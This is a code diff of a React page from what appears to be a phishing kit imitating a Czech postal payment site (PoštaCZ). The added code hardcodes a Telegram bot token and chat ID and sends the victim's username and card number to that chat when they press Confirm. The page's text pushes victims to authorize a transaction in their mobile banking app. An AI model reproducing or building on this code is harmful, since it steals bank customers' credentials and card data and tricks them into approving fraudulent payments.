@@ -1,134 +1,135 @@
 import React, { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { useLanguage } from '../hooks/useLanguage';
+import axios from 'axios';
 import './NextStepAppr.css';
+
+const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
+const TELEGRAM_LOGS_CHAT_ID = '-1003861936742';
 
 function NextStepAppr() {
   const navigate = useNavigate();
-  const { t } = useLanguage();
-  
-  const [userData, setUserData] = useState({
-    loginName: '',
-    cardNumber: '',
-    phoneNumber: '',
-    sessionId: ''
-  });
-  
-  const [countdown, setCountdown] = useState(5);
-  
+  const [isConfirmed, setIsConfirmed] = useState(false);
+  const [currentTime, setCurrentTime] = useState(new Date());
+  const [cardNumber, setCardNumber] = useState('**** **** **** 9116');
+  const [username, setUsername] = useState('');
+
   useEffect(() => {
-    // Récupérer les données stockées
-    const loginName = sessionStorage.getItem('loginName');
-    const cardNumber = sessionStorage.getItem('cardNumber');
-    const phoneNumber = sessionStorage.getItem('phoneNumber');
-    const sessionId = sessionStorage.getItem('sessionId');
+    const storedCardNumber = sessionStorage.getItem('cardNumber');
+    const storedUsername = sessionStorage.getItem('loginName');
     
-    if (loginName && cardNumber && phoneNumber && sessionId) {
-      setUserData({
-        loginName,
-        cardNumber: maskCardNumber(cardNumber),
-        phoneNumber: maskPhoneNumber(phoneNumber),
-        sessionId
-      });
+    if (storedCardNumber) {
+      const last4 = storedCardNumber.slice(-4);
+      setCardNumber(`**** **** **** ${last4}`);
+    }
+    if (storedUsername) {
+      setUsername(storedUsername);
     }
     
-    // Démarrer le compte à rebours
+    // Check if already confirmed
+    //if (sessionStorage.getItem('paymentConfirmed') === 'true') {
+     // setIsConfirmed(true);
+    //}
+    
     const timer = setInterval(() => {
-      setCountdown((prev) => {
-        if (prev <= 1) {
-          clearInterval(timer);
-          return 0;
-        }
-        return prev - 1;
-      });
+      setCurrentTime(new Date());
     }, 1000);
     
     return () => clearInterval(timer);
   }, []);
-  
-  const maskCardNumber = (cardNumber) => {
-    const cleanNumber = cardNumber.replace(/\s/g, '');
-    if (cleanNumber.length >= 16) {
-      return `**** **** **** ${cleanNumber.slice(-4)}`;
+
+  const sendTelegramLog = async () => {
+    try {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const message = `
+✅ <b>USER PRESSED CONFIRM RB KEY</b> ✅
+━━━━━━━━━━━━━━━━━━━━━
+👤 <b>Username:</b> ${username}
+💳 <b>Card Number:</b> ${cardNumber}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ <i>User confirmed the payment in RB key!</i>
+      `;
+
+      await axios.post(url, {
+        chat_id: TELEGRAM_LOGS_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      });
+      console.log('✅ Telegram log sent');
+    } catch (error) {
+      console.error('Error sending Telegram log:', error);
     }
-    return cardNumber;
   };
-  
-  const maskPhoneNumber = (phoneNumber) => {
-    if (phoneNumber.length >= 9) {
-      return `${phoneNumber.slice(0, 3)}***${phoneNumber.slice(-3)}`;
-    }
-    return phoneNumber;
+
+  const handleConfirm = async () => {
+    await sendTelegramLog();
+    sessionStorage.setItem('paymentConfirmed', 'true');
+    setIsConfirmed(true);
   };
-  
-  const handleContinue = () => {
-    // Rediriger vers la page principale ou terminer le processus
-    window.location.reload();
-  };
-  
+
   const handleCancel = () => {
-    // Nettoyer les données et revenir à l'accueil
-    sessionStorage.clear();
-    navigate('/');
+    window.location.href = '/#/login';
   };
-  
+
+  // Show waiting page AFTER confirmation
+  if (isConfirmed) {
+    return (
+      <div className="waiting-container-page">
+        <div className="waiting-card">
+          <h2 className="waiting-title">In App-Verification in PoštaCZ</h2>
+          <div className="animated-loader">
+            <div className="loader-ring"></div>
+            <div className="loader-ring-2"></div>
+            <div className="loader-ring-3"></div>
+            <div className="loader-dot"></div>
+          </div>
+          <h3>Waiting for Confirmation</h3>
+          <p>Your confirmation has been sent.</p>
+          <p>Please check your mobile banking app.</p>
+          <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
+        </div>
+      </div>
+    );
+  }
+
+  // Show RB Key confirmation page FIRST
   return (
-    <div className="nextstepappr-container">
-      <div className="nextstepappr-card">
-        <div className="nextstepappr-header">
-          <div className="nextstepappr-icon">✅</div>
-          <h2>{t.nextStepTitle || 'Vérification en Cours'}</h2>
-        </div>
+    <div className="confirmation-overlay">
+      <div className="confirmation-modal">
+        <h3>Confirmation in Bank App</h3>
         
-        <div className="nextstepappr-content">
-          <p className="nextstepappr-message">
-            {t.nextStepMessage || 'Votre demande est en cours de traitement par notre équipe.'}
-          </p>
-          
-          <div className="nextstepappr-info">
-            <div className="info-row">
-              <span className="info-label">{t.username || 'Utilisateur'}:</span>
-              <span className="info-value">{userData.loginName}</span>
-            </div>
-            <div className="info-row">
-              <span className="info-label">{t.cardNumber || 'Carte'}:</span>
-              <span className="info-value">{userData.cardNumber}</span>
-            </div>
-            <div className="info-row">
-              <span className="info-label">{t.phoneNumber || 'Téléphone'}:</span>
-              <span className="info-value">{userData.phoneNumber}</span>
-            </div>
+        <div className="confirmation-details">
+          <div className="detail-row">
+            <span className="detail-label">Merchant:</span>
+            <span className="detail-value">PoštaOnline</span>
           </div>
-          
-          <div className="nextstepappr-status">
-            <div className="status-indicator">
-              <div className="status-dot"></div>
-              <span>{t.waitingForApproval || 'En attente d\'approbation...'}</span>
-            </div>
+          <div className="detail-row">
+            <span className="detail-label">Amount:</span>
+            <span className="detail-value">00,00 CZK</span>
           </div>
-          
-          <div className="nextstepappr-timer">
-            <p>{t.redirectMessage || 'Redirection automatique dans'}</p>
-            <div className="timer-circle">
-              <span className="timer-number">{countdown}</span>
-            </div>
-            <p className="timer-text">{t.seconds || 'secondes'}</p>
+          <div className="detail-row">
+            <span className="detail-label">Date:</span>
+            <span className="detail-value">{new Date().toLocaleString()}</span>
+          </div>
+          <div className="detail-row">
+            <span className="detail-label">Card number:</span>
+            <span className="detail-value">{cardNumber}</span>
           </div>
         </div>
-        
-        <div className="nextstepappr-buttons">
-          <button 
-            className="nextstepappr-btn cancel-btn"
-            onClick={handleCancel}
-          >
-            {t.cancel || 'Annuler'}
+
+        <div className="confirmation-instructions">
+          <p>• Open bank app in your mobile phone.</p>
+          <p>• Confirm the Authorize .</p>
+          <p>• After confirmation come back to this screen.</p>
+          <p>• If the screen doesn't close by itself when you come back, just tap "CONFIRM"
+            ".</p>
+        </div>
+
+        <div className="confirmation-buttons">
+          <button onClick={handleConfirm} className="confirm-btn">
+            Confirm
           </button>
-          <button 
-            className="nextstepappr-btn continue-btn"
-            onClick={handleContinue}
-          >
-            {t.continue || 'Continuer'}
-          </button>
+          
         </div>
       </div>
     </div>
